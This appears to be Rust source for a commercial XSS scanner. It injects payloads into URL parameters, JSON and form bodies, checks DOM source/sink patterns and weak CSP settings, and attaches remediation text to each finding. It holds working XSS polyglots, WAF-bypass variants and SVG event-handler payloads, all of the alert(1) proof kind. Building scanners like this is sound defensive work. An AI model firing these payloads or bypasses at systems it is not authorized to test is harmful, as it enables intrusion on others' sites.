// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Enhanced XSS Scanner with Context Awareness
 * Improved detection, JSON support, and mutation testing
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::payloads;
use crate::scanners::xss_detection::{InjectionContext, XssDetector};
use crate::types::{ScanConfig, Severity, Confidence, Vulnerability};
use anyhow::Result;
use futures::stream::{self, StreamExt};
use serde_json::Value;
use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use tracing::{debug, info, warn};

pub struct EnhancedXssScanner {
    http_client: Arc<HttpClient>,
    detector: XssDetector,
    confirmed_vulns: Arc<Mutex<HashSet<String>>>, // Deduplication with interior mutability
    dom_sources: Vec<String>,          // DOM XSS sources
    dom_sinks: Vec<String>,            // DOM XSS sinks
}

impl EnhancedXssScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        let dom_sources = vec![
            "location.hash".to_string(),
            "location.search".to_string(),
            "location.href".to_string(),
            "document.URL".to_string(),
            "document.documentURI".to_string(),
            "document.referrer".to_string(),
            "window.name".to_string(),
        ];

        let dom_sinks = vec![
            "eval(".to_string(),
            "setTimeout(".to_string(),
            "setInterval(".to_string(),
            "Function(".to_string(),
            "innerHTML".to_string(),
            "outerHTML".to_string(),
            "document.write(".to_string(),
            "document.writeln(".to_string(),
            ".html(".to_string(),
            "location.href=".to_string(),
            "location.assign(".to_string(),
        ];

        Self {
            http_client,
            detector: XssDetector::new(),
            confirmed_vulns: Arc::new(Mutex::new(HashSet::new())),
            dom_sources,
            dom_sinks,
        }
    }

    /// Scan parameter with context-aware payloads and confirmation
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Mandatory authorization check
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("XSS scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("Testing parameter '{}' for XSS (enhanced)", parameter);

        let parameter_owned = parameter.to_string();
        let payloads = payloads::get_xss_payloads(config.scan_mode.as_str());
        let total_payloads = payloads.len();

        debug!("Testing {} XSS payloads with confirmation", total_payloads);

        let mut vulnerabilities = Vec::new();
        // Use higher concurrency for faster scanning - adaptive based on mode
        let concurrent_requests = match config.scan_mode.as_str() {
            "insane" => 200,
            "thorough" => 100,
            _ => 50,
        };

        // Phase 1: Initial detection
        let results = stream::iter(payloads.clone())
            .map(|payload| {
                let url = base_url.to_string();
                let param = parameter_owned.clone();
                let client = Arc::clone(&self.http_client);

                async move {
                    let test_url = if url.contains('?') {
                        format!("{}&{}={}", url, param, urlencoding::encode(&payload))
                    } else {
                        format!("{}?{}={}", url, param, urlencoding::encode(&payload))
                    };

                    match client.get(&test_url).await {
                        Ok(response) => Some((payload, response, test_url)),
                        Err(e) => {
                            debug!("Request failed for payload '{}': {}", payload, e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        // Phase 2: Analyze with context detection
        for result in results {
            if let Some((payload, response, test_url)) = result {
                let detection = self.detector.detect(&payload, &response);

                if detection.detected && detection.confidence > 0.6 {
                    // Phase 3: Confirm with mutation
                    if let Ok(confirmed) = self.confirm_with_mutation(
                        base_url,
                        &parameter_owned,
                        &payload,
                        &detection.context,
                    ).await {
                        if confirmed {
                            let context_clone = detection.context.clone();
                            let vuln_key = format!("{}:{}:{}", test_url, parameter_owned, context_clone as u8);

                            // Deduplicate
                            let mut vulns = self.confirmed_vulns.lock().unwrap();
                            if !vulns.contains(&vuln_key) {
                                vulns.insert(vuln_key);

                                let (severity, confidence) = self.map_confidence_to_severity(detection.confidence);

                                let vuln = Vulnerability {
                                    id: format!("xss_{}", uuid::Uuid::new_v4()),
                                    vuln_type: "Cross-Site Scripting (XSS)".to_string(),
                                    severity,
                                    confidence,
                                    category: "Injection".to_string(),
                                    url: test_url.clone(),
                                    parameter: Some(parameter_owned.clone()),
                                    payload: payload.clone(),
                                    description: format!(
                                        "XSS vulnerability in {} context. Evidence: {}",
                                        format!("{:?}", detection.context),
                                        detection.evidence.join(", ")
                                    ),
                                    evidence: Some(detection.evidence.join("\n")),
                                    cwe: "CWE-79".to_string(),
                                    cvss: 7.1,
                                    verified: true,
                                    false_positive: false,
                                    remediation: self.get_remediation(&detection.context),
                                    discovered_at: chrono::Utc::now().to_rfc3339(),
                                };

                                info!(
                                    "Confirmed XSS: {} in parameter '{}' (context: {:?}, confidence: {:.2})",
                                    vuln.severity, parameter_owned, detection.context, detection.confidence
                                );

                                vulnerabilities.push(vuln);
                            }
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, total_payloads))
    }

    /// Scan POST body with proper JSON/form handling
    pub async fn scan_post_body(
        &self,
        url: &str,
        body_param: &str,
        existing_body: &str,
        content_type: Option<&str>,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("Testing POST parameter '{}' for XSS (enhanced)", body_param);

        let body_param_owned = body_param.to_string();
        let payloads = payloads::get_xss_payloads(config.scan_mode.as_str());
        let total_payloads = payloads.len();

        let mut vulnerabilities = Vec::new();
        let concurrent_requests = match config.scan_mode.as_str() {
            "insane" => 200,
            "thorough" => 100,
            _ => 50,
        };

        // Detect content type
        let is_json = content_type
            .map(|ct| ct.contains("json"))
            .unwrap_or_else(|| existing_body.trim_start().starts_with('{'));

        let results = stream::iter(payloads)
            .map(|payload| {
                let url = url.to_string();
                let param = body_param_owned.clone();
                let body = existing_body.to_string();
                let client = Arc::clone(&self.http_client);

                async move {
                    // Build test body based on content type
                    let test_body = if is_json {
                        Self::inject_json_payload(&body, &param, &payload).unwrap_or(body.clone())
                    } else {
                        Self::inject_form_payload(&body, &param, &payload)
                    };

                    match client.post(&url, test_body).await {
                        Ok(response) => Some((payload, response, url)),
                        Err(e) => {
                            debug!("POST request failed: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        // Analyze responses
        for result in results {
            if let Some((payload, response, test_url)) = result {
                let detection = self.detector.detect(&payload, &response);

                if detection.detected && detection.confidence > 0.6 {
                    let vuln_key = format!("{}:{}:POST", test_url, body_param_owned);

                    let mut vulns = self.confirmed_vulns.lock().unwrap();
                    if !vulns.contains(&vuln_key) {
                        vulns.insert(vuln_key);

                        let (severity, confidence) = self.map_confidence_to_severity(detection.confidence);

                        let vuln = Vulnerability {
                            id: format!("xss_{}", uuid::Uuid::new_v4()),
                            vuln_type: "Cross-Site Scripting (XSS) - POST".to_string(),
                            severity,
                            confidence,
                            category: "Injection".to_string(),
                            url: test_url.clone(),
                            parameter: Some(body_param_owned.clone()),
                            payload: payload.clone(),
                            description: format!(
                                "XSS vulnerability in POST body ({}). Context: {:?}",
                                if is_json { "JSON" } else { "Form" },
                                detection.context
                            ),
                            evidence: Some(detection.evidence.join("\n")),
                            cwe: "CWE-79".to_string(),
                            cvss: 7.1,
                            verified: true,
                            false_positive: false,
                            remediation: self.get_remediation(&detection.context),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        };

                        info!(
                            "Confirmed POST XSS: {} in parameter '{}'",
                            vuln.severity, body_param_owned
                        );

                        vulnerabilities.push(vuln);
                    }
                }
            }
        }

        Ok((vulnerabilities, total_payloads))
    }

    /// Inject payload into JSON body
    fn inject_json_payload(body: &str, param: &str, payload: &str) -> Result<String> {
        // Parse JSON
        let mut json: Value = serde_json::from_str(body)?;

        // Navigate and inject (supports nested paths like "user.name")
        let parts: Vec<&str> = param.split('.').collect();
        if parts.len() == 1 {
            // Simple case
            json[param] = Value::String(payload.to_string());
        } else {
            // Nested case
            let mut current = &mut json;
            for (i, part) in parts.iter().enumerate() {
                if i == parts.len() - 1 {
                    current[part] = Value::String(payload.to_string());
                } else {
                    current = &mut current[part];
                }
            }
        }

        Ok(serde_json::to_string(&json)?)
    }

    /// Inject payload into form body
    fn inject_form_payload(body: &str, param: &str, payload: &str) -> String {
        // Parse form data
        let pairs: Vec<&str> = body.split('&').collect();
        let mut result = Vec::new();

        let mut found = false;
        for pair in pairs {
            if let Some((key, _value)) = pair.split_once('=') {
                if key == param {
                    result.push(format!("{}={}", key, urlencoding::encode(payload)));
                    found = true;
                } else {
                    result.push(pair.to_string());
                }
            } else {
                result.push(pair.to_string());
            }
        }

        if !found {
            result.push(format!("{}={}", param, urlencoding::encode(payload)));
        }

        result.join("&")
    }

    /// Confirm vulnerability with mutated payload
    async fn confirm_with_mutation(
        &self,
        base_url: &str,
        parameter: &str,
        original_payload: &str,
        _context: &InjectionContext,
    ) -> Result<bool> {
        // Get context-specific mutations
        let mutations = self.detector.mutate_payload(original_payload);

        // Test first 2 mutations for performance
        for mutation in mutations.iter().take(2) {
            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(mutation))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(mutation))
            };

            if let Ok(response) = self.http_client.get(&test_url).await {
                let detection = self.detector.detect(mutation, &response);
                if detection.detected {
                    debug!("Confirmed with mutation: {}", mutation);
                    return Ok(true);
                }
            }
        }

        Ok(false)
    }

    /// Map confidence score to Severity/Confidence pair
    fn map_confidence_to_severity(&self, score: f32) -> (Severity, Confidence) {
        if score >= 0.9 {
            (Severity::High, Confidence::High)
        } else if score >= 0.7 {
            (Severity::High, Confidence::Medium)
        } else if score >= 0.5 {
            (Severity::Medium, Confidence::Medium)
        } else {
            (Severity::Medium, Confidence::Low)
        }
    }

    /// Get remediation advice based on context
    fn get_remediation(&self, context: &InjectionContext) -> String {
        match context {
            InjectionContext::HtmlBody => {
                "Encode all user input before rendering in HTML. Use context-aware encoding (HTML entity encoding).".to_string()
            }
            InjectionContext::HtmlAttribute => {
                "Encode user input for HTML attribute context. Prefer using safe attributes and avoid dynamic event handlers.".to_string()
            }
            InjectionContext::JavaScriptString => {
                "Never place user input directly in JavaScript strings. Use JSON.stringify() or proper JS encoding.".to_string()
            }
            InjectionContext::JavaScriptCode => {
                "Never allow user input in JavaScript code context. Use data attributes or JSON instead.".to_string()
            }
            InjectionContext::UrlParameter => {
                "Validate and sanitize URLs. Use allowlists for protocols. Encode for URL context.".to_string()
            }
            InjectionContext::CssContext => {
                "Avoid user input in CSS. If necessary, use strict validation and encoding.".to_string()
            }
            InjectionContext::JsonValue => {
                "Encode user input in JSON values. Ensure JSON is not rendered directly as HTML.".to_string()
            }
            InjectionContext::Unknown => {
                "Apply context-appropriate encoding for all user input. Implement Content Security Policy.".to_string()
            }
        }
    }

    /// Scan for DOM-based XSS vulnerabilities
    pub async fn scan_dom_xss(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("Testing for DOM-based XSS at {}", url);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Fetch page to analyze JavaScript
        if let Ok(response) = self.http_client.get(url).await {
            let body = &response.body;

            // Check for dangerous data flow patterns
            for source in &self.dom_sources {
                for sink in &self.dom_sinks {
                    tests_run += 1;

                    // Look for patterns like: var x = location.hash; element.innerHTML = x;
                    if body.contains(source) && body.contains(sink) {
                        // This is a potential DOM XSS
                        let vuln_key = format!("dom:{}:{}", source, sink);

                        let mut vulns = self.confirmed_vulns.lock().unwrap();
                        if !vulns.contains(&vuln_key) {
                            vulns.insert(vuln_key);

                            let vuln = Vulnerability {
                                id: format!("xss_dom_{}", uuid::Uuid::new_v4()),
                                vuln_type: "DOM-based XSS".to_string(),
                                severity: Severity::High,
                                confidence: Confidence::Medium, // DOM XSS requires manual verification
                                category: "Injection".to_string(),
                                url: url.to_string(),
                                parameter: Some(source.clone()),
                                payload: format!("#<img src=x onerror=alert(1)>"),
                                description: format!(
                                    "Potential DOM-based XSS: data flows from {} to {}",
                                    source, sink
                                ),
                                evidence: Some(format!(
                                    "Found JavaScript code that reads from {} and writes to {}",
                                    source, sink
                                )),
                                cwe: "CWE-79".to_string(),
                                cvss: 7.1,
                                verified: false, // Needs manual confirmation
                                false_positive: false,
                                remediation: "Sanitize data from DOM sources before using in DOM sinks. Use textContent instead of innerHTML.".to_string(),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                            };

                            info!("Potential DOM XSS: {} -> {}", source, sink);
                            vulnerabilities.push(vuln);
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan headers for reflected XSS
    pub async fn scan_headers(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("Testing headers for XSS reflection");

        let payloads = payloads::get_xss_payloads(config.scan_mode.as_str());
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Test common reflective headers with XSS payloads
        let test_headers = vec![
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "X-Original-URL",
            "Cookie",
        ];

        // Use subset of payloads for header testing
        for header_name in test_headers {
            for payload in payloads.iter().take(10) {
                tests_run += 1;

                // Note: HttpClient would need enhancement to support custom headers
                // For now, test via URL parameters that might reflect in headers
                let test_url = format!("{}?header_test={}", url, urlencoding::encode(payload));

                if let Ok(response) = self.http_client.get(&test_url).await {
                    let detection = self.detector.detect(payload, &response);

                    if detection.detected && detection.confidence > 0.6 {
                        let vuln_key = format!("header:{}:{}", header_name, payload);

                        let mut vulns = self.confirmed_vulns.lock().unwrap();
                        if !vulns.contains(&vuln_key) {
                            vulns.insert(vuln_key);

                            let vuln = Vulnerability {
                                id: format!("xss_header_{}", uuid::Uuid::new_v4()),
                                vuln_type: "Header-based XSS".to_string(),
                                severity: Severity::Medium,
                                confidence: Confidence::Medium,
                                category: "Injection".to_string(),
                                url: test_url.clone(),
                                parameter: Some(header_name.to_string()),
                                payload: payload.clone(),
                                description: format!(
                                    "XSS via {} header reflection",
                                    header_name
                                ),
                                evidence: Some(detection.evidence.join("\n")),
                                cwe: "CWE-79".to_string(),
                                cvss: 6.1,
                                verified: true,
                                false_positive: false,
                                remediation: "Sanitize and encode header values before reflection.".to_string(),
                                discovered_at: chrono::Utc::now().to_rfc3339(),
                            };

                            info!("Header XSS in {}", header_name);
                            vulnerabilities.push(vuln);
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Generate polyglot payloads (work in multiple contexts)
    fn get_polyglot_payloads(&self) -> Vec<String> {
        vec![
            // Works in HTML, JS string, attribute
            r#"'"><script>alert(String.fromCharCode(88,83,83))</script>"#.to_string(),

            // SVG polyglot
            r#"<svg/onload=alert(1)>"#.to_string(),

            // Multi-context polyglot
            r#"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"#.to_string(),

            // Template polyglot
            r#"{{7*7}}${7*7}#{7*7}%{7*7}"#.to_string(),

            // Markdown polyglot
            r#"[clickme](javascript:alert(1))"#.to_string(),

            // XML/SVG hybrid
            r#"<svg><script>alert&#40;1&#41;</script></svg>"#.to_string(),
        ]
    }

    /// Generate WAF bypass payloads
    fn get_waf_bypass_payloads(&self) -> Vec<String> {
        vec![
            // Case mixing
            "<sCrIpT>alert(1)</sCrIpT>".to_string(),

            // Null bytes and comments
            "<script>al/**/ert(1)</script>".to_string(),

            // Encoding variations
            "<script>alert(String.fromCharCode(49))</script>".to_string(),

            // Unicode bypasses
            "<script>\\u0061lert(1)</script>".to_string(),

            // HTML entities
            "<script>&#97;lert(1)</script>".to_string(),

            // Line breaks
            "<img\nsrc=x\nonerror=alert(1)>".to_string(),

            // Tab characters
            "<img\tsrc=x\tonerror=alert(1)>".to_string(),

            // Multiple encoding
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E".to_string(),
        ]
    }

    /// Detect CSP and check for bypasses
    async fn detect_csp_bypass(&self, url: &str) -> Result<Vec<String>> {
        let mut bypass_vectors = Vec::new();

        if let Ok(response) = self.http_client.get(url).await {
            // Check if CSP header exists
            if let Some(csp) = response.headers.get("content-security-policy") {
                debug!("CSP detected: {}", csp);

                // Check for common CSP bypass conditions
                if csp.contains("'unsafe-inline'") {
                    bypass_vectors.push("CSP allows 'unsafe-inline' - inline scripts permitted".to_string());
                }

                if csp.contains("'unsafe-eval'") {
                    bypass_vectors.push("CSP allows 'unsafe-eval' - eval() permitted".to_string());
                }

                if csp.contains("data:") {
                    bypass_vectors.push("CSP allows data: URIs - data URIs permitted".to_string());
                }

                if csp.contains("*") {
                    bypass_vectors.push("CSP uses wildcard - overly permissive".to_string());
                }

                // Check for JSONP endpoints that might bypass CSP
                if csp.contains("script-src") && !csp.contains("'none'") {
                    bypass_vectors.push("Check for JSONP endpoints to bypass CSP".to_string());
                }
            } else {
                bypass_vectors.push("No CSP header - no client-side XSS protection".to_string());
            }
        }

        Ok(bypass_vectors)
    }

    /// Test SVG-based XSS vectors
    pub async fn scan_svg_xss(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("Testing SVG-based XSS vectors");

        let svg_payloads = vec![
            r#"<svg/onload=alert(1)>"#,
            r#"<svg><script>alert(1)</script></svg>"#,
            r#"<svg><animate onbegin=alert(1) attributeName=x dur=1s>"#,
            r#"<svg><set attributeName="onmouseover" to="alert(1)">"#,
            r#"<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>"#,
            r#"data:image/svg+xml,<svg/onload=alert(1)>"#,
        ];

        let mut vulnerabilities = Vec::new();
        let total = svg_payloads.len();

        for payload in svg_payloads {
            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
            };

            if let Ok(response) = self.http_client.get(&test_url).await {
                let detection = self.detector.detect(payload, &response);

                if detection.detected && detection.confidence > 0.6 {
                    let vuln_key = format!("svg:{}:{}", test_url, parameter);

                    let mut vulns = self.confirmed_vulns.lock().unwrap();
                    if !vulns.contains(&vuln_key) {
                        vulns.insert(vuln_key);

                        let vuln = Vulnerability {
                            id: format!("xss_svg_{}", uuid::Uuid::new_v4()),
                            vuln_type: "SVG-based XSS".to_string(),
                            severity: Severity::High,
                            confidence: Confidence::High,
                            category: "Injection".to_string(),
                            url: test_url.clone(),
                            parameter: Some(parameter.to_string()),
                            payload: payload.to_string(),
                            description: "XSS vulnerability via SVG vector".to_string(),
                            evidence: Some(detection.evidence.join("\n")),
                            cwe: "CWE-79".to_string(),
                            cvss: 7.1,
                            verified: true,
                            false_positive: false,
                            remediation: "Sanitize SVG content. Disable inline SVG if not needed.".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        };

                        info!("SVG XSS detected in parameter '{}'", parameter);
                        vulnerabilities.push(vuln);
                    }
                }
            }
        }

        Ok((vulnerabilities, total))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_inject_json_payload() {
        let body = r#"{"name":"test","email":"test@example.com"}"#;
        let result = EnhancedXssScanner::inject_json_payload(body, "name", "<script>alert(1)</script>")
            .unwrap();

        assert!(result.contains("<script>alert(1)</script>"));
        assert!(result.contains("email"));
    }

    #[test]
    fn test_inject_nested_json_payload() {
        let body = r#"{"user":{"name":"test"}}"#;
        let result = EnhancedXssScanner::inject_json_payload(body, "user.name", "payload")
            .unwrap();

        assert!(result.contains("payload"));
    }

    #[test]
    fn test_inject_form_payload() {
        let body = "name=test&email=test@example.com";
        let result = EnhancedXssScanner::inject_form_payload(body, "name", "<script>");

        assert!(result.contains("%3Cscript%3E")); // URL encoded
    }
}
